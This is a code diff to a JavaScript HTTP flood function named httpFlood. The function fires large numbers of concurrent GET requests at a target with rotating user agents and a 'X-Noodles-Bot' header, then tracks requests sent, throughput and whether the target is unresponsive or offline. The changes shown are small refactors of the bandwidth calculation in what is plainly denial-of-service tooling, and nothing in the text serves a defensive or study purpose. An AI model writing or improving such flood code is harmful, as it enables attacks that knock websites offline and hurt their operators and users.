@@ -31,7 +31,6 @@ async function httpFlood(target, duration, intensity) {
       const promises = [];
       for (let i = 0; i < intensity; i++) {
         const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-        const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nX-Noodles-Bot: Active\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n`;
 
         const promise = fetch(target, {
             method: 'GET',
@@ -46,10 +45,7 @@ async function httpFlood(target, duration, intensity) {
           .then(response => {
             if (response.ok) {
               packetsSent++;
-              mbps += payload.length / 1000000;
-              if (response.status !== 200) {
-                  targetStatus = 'Unresponsive';
-              }
+              mbps += (new TextEncoder().encode(`GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nX-Noodles-Bot: Active\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n`).length) / 1000000;
             } else {
               targetStatus = 'Unresponsive';
             }
@@ -57,6 +53,7 @@ async function httpFlood(target, duration, intensity) {
           .catch(error => {
             targetStatus = 'Offline';
           });
+
         promises.push(promise);
       }
       await Promise.all(promises);
@@ -68,6 +65,7 @@ async function httpFlood(target, duration, intensity) {
   }
 
   mbps = (mbps * 8) / ((Date.now() - startTime) / 1000);
+    mbps = Math.max(0, mbps);
   return { packetsSent, targetStatus, mbps };
 }
 
